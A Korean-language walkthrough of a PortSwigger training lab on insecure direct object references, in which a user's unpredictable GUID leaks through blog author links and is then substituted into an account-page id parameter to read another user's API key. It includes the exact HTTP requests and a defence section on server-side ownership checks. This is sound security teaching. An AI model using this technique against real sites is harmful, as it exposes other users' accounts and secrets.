# Lab: User ID controlled by request parameter, with unpredictable user IDs

## 개요

- **난이도**: Apprentice
- **주제**: Access Control — 수평적 권한 상승 / IDOR / 예측 불가 GUID 노출 경유
- **링크**: https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-unpredictable-user-ids

## 목표

사용자 식별자가 GUID(예측 불가)이지만 애플리케이션 내 다른 위치에 노출된다. `carlos` 의 GUID 를 찾아 계정 페이지의 `id` 파라미터에 넣고, 그의 API 키를 획득해 제출한다.

- 계정: `wiener:peter`

## 이전 랩(005)과의 차이

```
[005 — id=wiener (예측 가능)]
  id 파라미터 값이 사용자 이름
  → carlos 로 바로 바꾸면 접근

[006 — id=<GUID> (예측 불가, 이번)]
  id 파라미터 값이 GUID 라 추측 불가
  → 그러나 블로그 작성자 링크 등에 GUID 가 노출
  → 노출된 GUID 를 수집해 id 에 대입
```

핵심: **식별자를 예측 불가능하게 만드는 것은 접근 제어가 아니다.
GUID 가 애플리케이션 어딘가에 노출되면 IDOR 는 그대로 성립한다.**

## GUID(Globally Unique Identifier) 란

```
예: 8f14e45f-ceea-4a3f-9c1e-2b3d4e5f6a7b

- 충돌 없는 고유 식별자
- 순차 증가하지 않아 추측/열거가 어려움
- 그러나 "비밀값" 이 아님
  → 사용자가 참조되는 모든 곳(게시글, 리뷰, 프로필 링크 등)에 노출될 수 있음
```

## 취약 지점

### 1. 계정 페이지의 GUID 기반 id 파라미터

```
GET /my-account?id=<GUID> HTTP/1.1
Cookie: session=<wiener 세션>
```

- 005 와 동일하게 소유자 검증이 없다.
- 다만 값이 GUID 라서 무작위 대입은 어렵다.

### 2. 블로그 게시글에서 작성자 GUID 노출

블로그 글에는 작성자 링크가 포함된다.

```html
<a href="/blogs?userId=8f14e45f-ceea-4a3f-9c1e-2b3d4e5f6a7b">carlos</a>
```

- 작성자 이름을 클릭하면 `userId` 파라미터에 GUID 가 그대로 드러난다.
- 즉 **식별자가 비밀이 아니며, 애플리케이션 스스로 공개**하고 있다.

## 공격 단계

### 1단계 — carlos 의 게시글 찾기

블로그 목록에서 작성자가 `carlos` 인 글을 찾는다.

```
GET /blogs HTTP/1.1
```

게시글 상세로 이동해 작성자 링크를 확인한다.

```html
<a href="/blogs?userId=8f14e45f-...">carlos</a>
```

### 2단계 — carlos 의 GUID 수집

작성자 링크를 클릭하거나 링크의 `userId` 값을 복사한다.

```
carlos GUID = 8f14e45f-ceea-4a3f-9c1e-2b3d4e5f6a7b
```

### 3단계 — 로그인 후 id 파라미터 대입

`wiener:peter` 로 로그인하고 본인 계정 페이지 요청을 캡처한다.

```
GET /my-account?id=<wiener GUID> HTTP/1.1
Cookie: session=<wiener 세션>
```

`id` 값을 carlos 의 GUID 로 교체해 전송한다.

```
GET /my-account?id=8f14e45f-ceea-4a3f-9c1e-2b3d4e5f6a7b HTTP/1.1
Cookie: session=<wiener 세션>
```

### 4단계 — API 키 획득 및 제출

응답에 carlos 의 계정 정보와 API 키가 반환된다. API 키를 제출해 랩 해결.

## GUID 가 보안이 되지 못하는 이유

```
[가정]
  GUID 는 추측할 수 없으니 안전하다

[현실]
  1. 사용자가 참조되는 곳마다 GUID 가 노출됨
     - 블로그 작성자, 리뷰, 댓글, 공유 링크, 프로필
  2. API 응답/JSON 에 포함되어 반환되는 경우가 많음
  3. GUID 를 "인가 없이" 사용하면 그저 값만 바꾸는 것으로 접근 가능

[정리]
  GUID 는 식별자일 뿐, 권한 검사를 대체하지 못한다.
  접근 제어는 "그 객체에 접근할 권한이 있는가" 로 판단해야 한다.
```

## 방어

```
[근본 원인]
  GUID 이든 무엇이든, 리소스 소유자 검증 없이 id 파라미터로 계정 조회

[올바른 방어]
  1. 리소스 접근 시 세션 사용자와 소유자 일치 검사
     - 불일치 시 403/404
  2. id 파라미터 대신 세션 기반 식별 사용
  3. GUID 노출 자체를 막기보다, 노출되어도 접근이 안 되게 인가 적용
     - GUID 를 비밀로 유지하는 것에 의존하지 않음
  4. 모든 리소스 조회 엔드포인트에 일관된 서버 측 인가

[안티패턴]
  "GUID 라서 안전하다" 는 가정
  UI 에서 링크를 숨기는 수준의 통제
```

## 핵심 정리

- id 값이 GUID 라 직접 예측할 수 없었지만, 블로그 작성자 링크에서 carlos 의 GUID 를 획득했다.
- 획득한 GUID 를 wiener 세션의 `/my-account?id=` 에 넣어 carlos 의 API 키를 읽었다.
- 예측 불가 식별자는 인가를 대체하지 못하며, 노출 경로가 있으면 IDOR 는 그대로 성립한다.
- 방어는 식별자 은닉이 아니라 소유자 검증(서버 측 인가)이다.

## 배운 점

- 005 는 식별자가 예측 가능해서, 006 은 GUID 라 예측은 어렵지만 다른 곳에 노출되어 접근이 가능했다.
- "추측 불가" 와 "접근 불가" 는 다르다. 정보 수집(게시글/리뷰/API 응답)으로 식별자를 모을 수 있다.
- GUID 를 사용하는 애플리케이션에서는 특히 GUID 가 노출되는 모든 표면을 인가 관점에서 점검해야 한다.
